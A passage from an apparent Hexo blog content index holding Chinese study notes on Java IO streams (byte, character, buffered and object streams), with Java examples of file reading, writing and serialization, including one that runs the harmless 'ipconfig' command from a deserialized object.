rel="noopener">https://blog.csdn.net/weixin_42139757/article/details/82108515</a></p>]]></content>
      
      
      <categories>
          
          <category> JAVA安全 </category>
          
          <category> JAVA基础 </category>
          
          <category> 集合 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>JAVA基础之IO流的学习笔记</title>
      <link href="2021/06/02/JAVA%E5%9F%BA%E7%A1%80%E4%B9%8BIO%E6%B5%81/"/>
      <url>2021/06/02/JAVA%E5%9F%BA%E7%A1%80%E4%B9%8BIO%E6%B5%81/</url>
      
        <content type="html"><![CDATA[<p><img src="/imgs/image-20210604102220915.png" alt="image-20210604102220915"></p><h3 id="IO流基本概念"><a href="#IO流基本概念" class="headerlink" title="IO流基本概念"></a>IO流基本概念</h3><p> Java对数据的操作是通过流的方式，IO流用来<strong>处理设备之间的数据传输、上传文件和下载文件</strong>，Java用于操作流的对象都在IO包中。</p><p>IO流分为字节流、字符流和其它流，总来说是<strong>五类一接口</strong> 其他类基本都是他们的延申：类 File、InputStream、OutputStream、Reader、Writer、RandomAccess和接口Serializable，其中InputStream、OutputStream属于字节流，Reader、Writer属于字符流。区分字节流和字符流可以通过这种方式：如果我们能在自己电脑上用笔记本打开一个文件，那么就可以用字符流去处理它，如果不行就用字节流。因为字符流只能处理文本数据 而字节流可以处理任何类型的文件数据。</p><h3 id="字节流"><a href="#字节流" class="headerlink" title="字节流"></a>字节流</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">基类 InputStream</span><br><span class="line">|__文件操作流 FilterInputStream</span><br><span class="line">        |__缓冲流 BufferedInputStream</span><br><span class="line">|__对象流 ObjectInputStream</span><br></pre></td></tr></table></figure><h4 id="字节流基础类"><a href="#字节流基础类" class="headerlink" title="字节流基础类"></a>字节流基础类</h4><h5 id="InputSream："><a href="#InputSream：" class="headerlink" title="InputSream："></a>InputSream：</h5><p>InputSream：抽象类，基于字节的输入操作，是所有输入流的父类。定义了所有输入流都具有的共同特征。</p><table><thead><tr><th>序号</th><th>方法名</th><th>解释</th></tr></thead><tbody><tr><td>1</td><td>abstract int read()</td><td>从输入流中读取数据的下一个字节</td></tr><tr><td>2</td><td>int read(byte[] b)</td><td>从输入流读取一些字节数，并将它们存储到缓冲区 b</td></tr><tr><td>3</td><td>int read(byte[] b, int off, int len)</td><td>从输入流读取最多 len字节的数据到一个字节数组。</td></tr><tr><td>4</td><td>void close()</td><td>关闭此输入流并释放与该流关联的所有系统资源</td></tr></tbody></table><h5 id="OutputStream"><a href="#OutputStream" class="headerlink" title="OutputStream:"></a>OutputStream:</h5><p>OutputStream：抽象类，基于字节的输出操作，是所有输出流的父类。定义了所有输出流都具有的共同特征。</p><table><thead><tr><th>序号</th><th>方法名</th><th>解释</th></tr></thead><tbody><tr><td>1</td><td>void write(byte[] b)</td><td>将 b.length 个字节从指定的 byte 数组写入此输出流</td></tr><tr><td>2</td><td>void write(byte[] b, int off, int len)</td><td>将指定 byte 数组中从偏移量 off 开始的 len 个字节写入此输出流</td></tr><tr><td>3</td><td>abstract void write(int b)</td><td>将指定的字节写入此输出流</td></tr><tr><td>4</td><td>void close()</td><td>关闭此输出流并释放与此流有关的所有系统资源</td></tr><tr><td>5</td><td>void flush()</td><td>刷新此输出流并强制写出所有缓冲的输出字节</td></tr></tbody></table><h4 id="字节文件操作流-FileInputStream-amp-FileOutputStream"><a href="#字节文件操作流-FileInputStream-amp-FileOutputStream" class="headerlink" title="字节文件操作流-FileInputStream&amp;FileOutputStream"></a>字节文件操作流-FileInputStream&amp;FileOutputStream</h4><p>FileInputStream：字节文件输入流，从文件系统中的某个文件中获得输入字节，用于读取诸如图像数据之类的原始字节流。</p><p>FileOutputStream：字节文件输出流是用于将数据写入到File，从程序中写入到其他位置。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FileInputStream常用方法：read()、close()</span><br><span class="line">FileOutputStream常用方法：write()、close()</span><br></pre></td></tr></table></figure><p>代码示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">fileInputStrameTest</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">       FileInputStream fileInputStream = <span class="keyword">new</span> FileInputStream(<span class="string">"E:\\1.txt"</span>);</span><br><span class="line">       <span class="keyword">int</span> by;</span><br><span class="line">       <span class="comment">//一次读取一个字节</span></span><br><span class="line">       <span class="keyword">while</span> ((by=fileInputStream.read())!=-<span class="number">1</span>)</span><br><span class="line">       &#123;</span><br><span class="line">           <span class="comment">//因为字符在底层存储的时候就是存储的数值。即字符对应的ASCII码。</span></span><br><span class="line">           <span class="comment">//所以需要强制转换一下类型</span></span><br><span class="line">           System.out.print((<span class="keyword">char</span>)by);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="comment">//关闭IO流</span></span><br><span class="line">       fileInputStream.close();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">fileOutputStreamTest</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">       <span class="comment">//FileOutputStream(String name, boolean append)如果第二个参数是true ，则字节将写入文件的末尾进行追加。</span></span><br><span class="line">       FileOutputStream fileOutputStream = <span class="keyword">new</span> FileOutputStream(<span class="string">"E:\\2.txt"</span>,<span class="keyword">true</span>);</span><br><span class="line">       Scanner scanner = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">       <span class="keyword">while</span>(scanner.hasNextInt())&#123;</span><br><span class="line">           <span class="keyword">int</span> a = scanner.nextInt();</span><br><span class="line">           fileOutputStream.write(a);</span><br><span class="line">       &#125;</span><br><span class="line">       scanner.close();</span><br><span class="line">       <span class="keyword">byte</span> b = <span class="number">0b1111011</span>;</span><br><span class="line">       fileOutputStream.write(b);</span><br><span class="line">       fileOutputStream.write(<span class="string">'\n'</span>);</span><br><span class="line">       <span class="keyword">byte</span>[] c = <span class="string">"123abc"</span>.getBytes();</span><br><span class="line">       System.out.println(c);</span><br><span class="line">       fileOutputStream.write(c);</span><br><span class="line">       fileOutputStream.close();</span><br><span class="line"></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h4 id="字节缓冲流（高效流）-BufferedInputStream-amp-BufferedOutputStream"><a href="#字节缓冲流（高效流）-BufferedInputStream-amp-BufferedOutputStream" class="headerlink" title="字节缓冲流（高效流）-BufferedInputStream&amp;BufferedOutputStream"></a>字节缓冲流（高效流）-BufferedInputStream&amp;BufferedOutputStream</h4><p><code>BufferedInputStream</code>和<code>BufferedOutputStream</code>类就是实现了缓冲功能的输入流/输出流。使用带缓冲的输入输出流，效率更高，速度更快。这两个类分别是<code>FilterInputStream</code>和<code>FilterOutputStream</code>的子类，作为装饰器子类，使用它们可以<strong>防止</strong>每次读取/发送数据时进行实际的写操作，代表着使用缓冲区。</p><p>我们有必要知道不带缓冲的操作，每读一个字节就要写入一个字节，由于涉及磁盘的IO操作相比内存的操作要慢很多，所以不带缓冲的流效率很低。带缓冲的流，可以一次读很多字节，但不向磁盘中写入，只是先放到内存里。等凑够了缓冲区大小的时候一次性写入磁盘，这种方式可以减少磁盘操作次数，速度就会提高很多！</p><p>同时正因为它们实现了缓冲功能，所以要注意在使用<code>BufferedOutputStream</code><strong>写完数据后，要调用<code>flush()</code>方法或<code>close()</code>方法</strong>，强行将缓冲区中的数据写出。否则可能无法写出数据。与之相似还<code>BufferedReader</code>和<code>BufferedWriter</code>两个类。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">构造方法：</span><br><span class="line"> &#x2F;&#x2F; 创建一个 BufferedInputStream并保存其参数，即输入流in，以便将来使用。</span><br><span class="line"> BufferedInputStream(InputStream in)</span><br><span class="line"> &#x2F;&#x2F; 创建具有指定缓冲区大小的 BufferedInputStream并保存其参数，即输入流in以便将来使用</span><br><span class="line"> BufferedInputStream(InputStream in, int size)</span><br></pre></td></tr></table></figure><p>BufferedOutputStream：字节缓冲输出流，提高了写出效率。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">构造方法：</span><br><span class="line">&#x2F;&#x2F; 创建一个新的缓冲输出流，以将数据写入指定的底层输出流</span><br><span class="line">BufferedOutputStream(OutputStream out)</span><br><span class="line">&#x2F;&#x2F; 创建一个新的缓冲输出流，以将具有指定缓冲区大小的数据写入指定的底层输出流</span><br><span class="line">BufferedOutputStream(OutputStream out, int size) </span><br><span class="line">常用方法：</span><br><span class="line">&#x2F;&#x2F; 将指定 byte 数组中从偏移量 off 开始的 len 个字节写入此缓冲的输出流</span><br><span class="line">void write(byte[] b, int off, int len)</span><br><span class="line">&#x2F;&#x2F; 将指定的字节写入此缓冲的输出流</span><br><span class="line">void write(int b)</span><br><span class="line">&#x2F;&#x2F; 刷新此缓冲的输出流</span><br><span class="line">void flush()</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">bufferInputStreamTest</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    BufferedInputStream bufferedInputStream = <span class="keyword">new</span> BufferedInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"E:\\1.txt"</span>));</span><br><span class="line">    <span class="comment">//缓冲区大小,代表一次最多读取1KB的内容</span></span><br><span class="line">    <span class="keyword">byte</span>[] s1=<span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> len;</span><br><span class="line">    <span class="keyword">while</span>((len=bufferedInputStream.read(s1))!=-<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        System.out.print(<span class="keyword">new</span> String(s1,<span class="number">0</span>,len));</span><br><span class="line">    &#125;</span><br><span class="line">    bufferedInputStream.close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">bufferOutputStreamTest</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    OutputStream outputStream = <span class="keyword">new</span> FileOutputStream(<span class="string">"E:\\2.txt"</span>);</span><br><span class="line">    BufferedOutputStream bufferedOutputStream = <span class="keyword">new</span> BufferedOutputStream(outputStream);</span><br><span class="line">    bufferedOutputStream.write(<span class="string">"好的我明白"</span>.getBytes());</span><br><span class="line">    bufferedOutputStream.flush();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">bufferTest</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    InputStream inputStream = <span class="keyword">new</span> FileInputStream(<span class="string">"E:\\1.txt"</span>);</span><br><span class="line">    FileOutputStream fileOutputStream = <span class="keyword">new</span> FileOutputStream(<span class="string">"E:\\2.txt"</span>);</span><br><span class="line">    <span class="keyword">byte</span>[] buffer = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">    <span class="keyword">int</span> len;</span><br><span class="line">    <span class="keyword">while</span> ((len=inputStream.read(buffer))!=-<span class="number">1</span>)&#123;</span><br><span class="line">        fileOutputStream.write(buffer,<span class="number">0</span>,len);</span><br><span class="line">    &#125;</span><br><span class="line">    inputStream.close();</span><br><span class="line">    fileOutputStream.flush();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="对象流-ObjectInputStream-amp-ObjectOutputStream及序列化"><a href="#对象流-ObjectInputStream-amp-ObjectOutputStream及序列化" class="headerlink" title="对象流-ObjectInputStream&amp;ObjectOutputStream及序列化"></a>对象流-ObjectInputStream&amp;ObjectOutputStream及序列化</h4><p>ObjectInputStream 和 ObjectOutputStream 的作用是对基本数据和对象进行序列化操作支持。<br>Serialization（序列化）是一种将对象转换为字节流的过程；反序列化deserialization是将字节流转换为对象的过程。<br>一个对象如果想要进行序列化，那么该对象的类<strong>必须实现Serializable接口</strong>。</p><p>示例在最后，因为涉及了字符流。</p><h3 id="字符流"><a href="#字符流" class="headerlink" title="字符流"></a>字符流</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">基类 Reader</span><br><span class="line"> |__字节转字符 转换流 InputStreamReader</span><br><span class="line"> |__文件操作流 FileReader</span><br><span class="line"> |__字符缓冲流 BufferReader</span><br></pre></td></tr></table></figure><h4 id="字符流基础类-Reader-amp-Writer"><a href="#字符流基础类-Reader-amp-Writer" class="headerlink" title="字符流基础类-Reader&amp;Writer"></a>字符流基础类-Reader&amp;Writer</h4><p>Reader：抽象类，基于字节的输入操作，是所有输入字符流的父类。</p><table><thead><tr><th>序号</th><th>方法</th><th>解释</th></tr></thead><tbody><tr><td>1</td><td>int read()</td><td>读取单个字符</td></tr><tr><td>2</td><td>int read(char[] cbuf)</td><td>将字符读入数组</td></tr><tr><td>3</td><td>abstract int read(char[] cbuf, int off, int len)</td><td>将字符读入数组的某一部分</td></tr><tr><td>4</td><td>long skip(long n)</td><td>跳过字符</td></tr><tr><td>5</td><td>abstract void close()</td><td>关闭该流并释放与之关联的所有资源</td></tr></tbody></table><p>Writer：抽象类，基于字节的输出操作，是所有输出字符流的父类。</p><table><thead><tr><th>序号</th><th>方法</th><th>解释</th></tr></thead><tbody><tr><td>1</td><td>void write(char[] cbuf)</td><td>写入字符数组</td></tr><tr><td>2</td><td>abstract void write(char[] cbuf, int off, int len)</td><td>写入字符数组的某一部分</td></tr><tr><td>3</td><td>void write(int c)</td><td>写入单个字符</td></tr><tr><td>4</td><td>void write(String str)</td><td>写入字符串</td></tr><tr><td>5</td><td>void write(String str, int off, int len)</td><td>写入字符串的某一部分</td></tr><tr><td>6</td><td>abstract void close()</td><td>关闭此流，但要先刷新它</td></tr><tr><td>7</td><td>abstract void flush()</td><td>刷新该流的缓冲</td></tr></tbody></table><h4 id="字符转换流-InputStreamReader-amp-OutputStreamWriter"><a href="#字符转换流-InputStreamReader-amp-OutputStreamWriter" class="headerlink" title="字符转换流-InputStreamReader&amp;OutputStreamWriter"></a>字符转换流-InputStreamReader&amp;OutputStreamWriter</h4><p>InputStreamReader：字节流转字符流，它使用的字符集可以由名称指定或显式给定，否则将接受平台默认的字符集。</p><p>OutputStreamWriter：字节流转字符流。</p><p>示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">inputStreamReaderTest</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    InputStreamReader inputStreamReader = <span class="keyword">new</span> InputStreamReader(<span class="keyword">new</span> FileInputStream(<span class="string">"E:\\1.txt"</span>));</span><br><span class="line">    <span class="keyword">char</span>[] c = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">1024</span>];</span><br><span class="line">    <span class="keyword">int</span> len;</span><br><span class="line">    <span class="keyword">while</span> ((len=inputStreamReader.read(c))!=-<span class="number">1</span>)&#123;</span><br><span class="line">        System.out.println(<span class="keyword">new</span> String(c,<span class="number">0</span>,len));</span><br><span class="line">    &#125;</span><br><span class="line">    inputStreamReader.close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">outputStreamWriterTest</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    OutputStreamWriter outputStreamWriter = <span class="keyword">new</span> OutputStreamWriter(<span class="keyword">new</span> FileOutputStream(<span class="string">"E:\\2.txt"</span>),<span class="string">"GBK"</span>);</span><br><span class="line">    String s = <span class="string">"123发士大夫艰苦"</span>;</span><br><span class="line">    outputStreamWriter.write(s);</span><br><span class="line">    outputStreamWriter.flush();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    InputStreamReader inputStreamReader = <span class="keyword">new</span> InputStreamReader(<span class="keyword">new</span> FileInputStream(<span class="string">"E:\\1.txt"</span>));</span><br><span class="line">    OutputStreamWriter outputStreamWriter = <span class="keyword">new</span> OutputStreamWriter(<span class="keyword">new</span> FileOutputStream(<span class="string">"E:\\2.txt"</span>),<span class="string">"GBK"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span>[] c = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">1024</span>];</span><br><span class="line">    <span class="keyword">int</span> len;</span><br><span class="line">    <span class="keyword">while</span> ((len=inputStreamReader.read(c))!=-<span class="number">1</span>)&#123;</span><br><span class="line">        outputStreamWriter.write(c);</span><br><span class="line">    &#125;</span><br><span class="line">    inputStreamReader.close();</span><br><span class="line">    outputStreamWriter.flush();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="字符文件操作流-FileReader-amp-FileWriter"><a href="#字符文件操作流-FileReader-amp-FileWriter" class="headerlink" title="字符文件操作流-FileReader&amp;FileWriter"></a>字符文件操作流-FileReader&amp;FileWriter</h4><p>FileReader：从InputStreamReader类继承而来。该类按字符读取流中数据。</p><p>FileWriter ：从 OutputStreamWriter 类继承而来。该类按字符向流中写入数据。</p><p>示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    FileTest fileTest = <span class="keyword">new</span> FileTest();</span><br><span class="line">    fileTest.fileWriterTest();</span><br><span class="line">    fileTest.fileReaderTest(<span class="string">"E:\\2.txt"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">fileReaderTest</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    FileReader fileReader = <span class="keyword">new</span> FileReader(filename);</span><br><span class="line">    <span class="keyword">char</span>[] c = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">1024</span>];</span><br><span class="line">    <span class="keyword">int</span> len;</span><br><span class="line">    <span class="keyword">while</span> ((len=fileReader.read(c))!=-<span class="number">1</span>)&#123;</span><br><span class="line">        System.out.println(<span class="keyword">new</span> String(c,<span class="number">0</span>,len));</span><br><span class="line">    &#125;</span><br><span class="line">    fileReader.close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">fileWriterTest</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    FileWriter fileWriter = <span class="keyword">new</span> FileWriter(<span class="string">"E:\\2.txt"</span>,<span class="keyword">true</span>);</span><br><span class="line">    String s = <span class="string">"123456哈哈哈"</span>;</span><br><span class="line">    fileWriter.write(s);</span><br><span class="line">    fileWriter.flush();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="字符缓冲流"><a href="#字符缓冲流" class="headerlink" title="字符缓冲流"></a>字符缓冲流</h4><p>字符缓冲流 BufferedReader和BufferedWriter跟字节缓冲流类似，只不过一个是字符一个是字节，BufferedReader和BufferedWriter是Reader和Writer的子类。</p><p>示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BufferTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        BufferTest bufferTest = <span class="keyword">new</span> BufferTest();</span><br><span class="line">        bufferTest.bufferWriterTest();</span><br><span class="line">        bufferTest.bufferReaderTest();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">bufferReaderTest</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        BufferedReader bufferedReader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> FileReader(<span class="string">"E:\\2.txt"</span>));</span><br><span class="line">        String s;</span><br><span class="line">        <span class="keyword">while</span> ((s=bufferedReader.readLine())!=<span class="keyword">null</span>) &#123;</span><br><span class="line">            System.out.println(s);</span><br><span class="line">        &#125;</span><br><span class="line">        bufferedReader.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">bufferWriterTest</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        BufferedWriter bufferedWriter = <span class="keyword">new</span> BufferedWriter(<span class="keyword">new</span> FileWriter(<span class="string">"E:\\2.txt"</span>,<span class="keyword">true</span>));</span><br><span class="line">        bufferedWriter.newLine();</span><br><span class="line">        bufferedWriter.write(<span class="string">"123123开发了"</span>);</span><br><span class="line">        bufferedWriter.flush();</span><br><span class="line">        bufferedWriter.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="对象流示例"><a href="#对象流示例" class="headerlink" title="对象流示例"></a>对象流示例</h3><p>示例：序列化一个对象之后，反序列化这个对象，并执行该对象的方法。另外更详细的说明可以看下之前的笔记<a href="https://rita888.github.io/2020/06/11/Java%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" target="_blank" rel="noopener">Java序列化和反序列化</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">public class Test &#123;</span><br><span class="line">    public static void main(String[] args) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">        Test test &#x3D; new Test();</span><br><span class="line">        test.objectToStreamTest();</span><br><span class="line">        test.streamToObjectTest();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void objectToStreamTest() throws IOException &#123;</span><br><span class="line">        &#x2F;&#x2F;对象转字节流</span><br><span class="line">        FileOutputStream fileOutputStream &#x3D; new FileOutputStream(&quot;E:\\1.txt&quot;);</span><br><span class="line">        ObjectOutputStream objectOutputStream &#x3D; new ObjectOutputStream(fileOutputStream);</span><br><span class="line">        Person person &#x3D; new Person();</span><br><span class="line">        objectOutputStream.writeObject(person);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void streamToObjectTest() throws IOException, ClassNotFoundException &#123;</span><br><span class="line">        &#x2F;&#x2F;字节流转对象</span><br><span class="line">        ObjectInputStream objectInputStream &#x3D; new ObjectInputStream(new FileInputStream(&quot;E:\\1.txt&quot;));</span><br><span class="line">        Person person1 &#x3D; (Person) objectInputStream.readObject();</span><br><span class="line">        person1.run();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Person implements Serializable&#123;</span><br><span class="line">    public void run() throws IOException &#123;</span><br><span class="line">        &#x2F;&#x2F;获取当前程序环境</span><br><span class="line">        Runtime runtime &#x3D; Runtime.getRuntime();</span><br><span class="line">        &#x2F;&#x2F;执行命令</span><br><span class="line">        Process process &#x3D; runtime.exec(new String[]&#123;&quot;ipconfig&quot;,&quot;&#x2F;a&quot;&#125;);</span><br><span class="line">        &#x2F;&#x2F;用缓冲区读取执行结果</span><br><span class="line">        BufferedReader bufferedReader &#x3D; new BufferedReader(new InputStreamReader(process.getInputStream()));</span><br><span class="line">        String s;</span><br><span class="line">        while ((s&#x3D;bufferedReader.readLine())!&#x3D;null)&#123;</span><br><span class="line">            System.out.println(s);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参考链接：</p><p><a href="https://www.kuangstudy.com/bbs/1356043480895451137" target="_blank" rel="noopener">https://www.kuangstudy.com/bbs/1356043480895451137</a></p><p><a href="https://blog.csdn.net/SUN__CGJ/article/details/109467222" target="_blank" rel="noopener">https://blog.csdn.net/SUN__CGJ/article/details/109467222</a></p><p><a href="https://www.cnblogs.com/zhaoyanjun/p/6376937.html" target="_blank" rel="noopener">https://www.cnblogs.com/zhaoyanjun/p/6376937.html</a></p><p><a href="https://www.cnblogs.com/yuler/p/11990543.html" target="_blank" rel="noopener">https://www.cnblogs.com/yuler/p/11990543.html</a></p>]]></content>
      
      
      <categories>
          
          <category> JAVA安全 </category>
          
          <category> JAVA基础 </category>
          
          <category> IO流 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JAVA基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java基础之常用类</title>
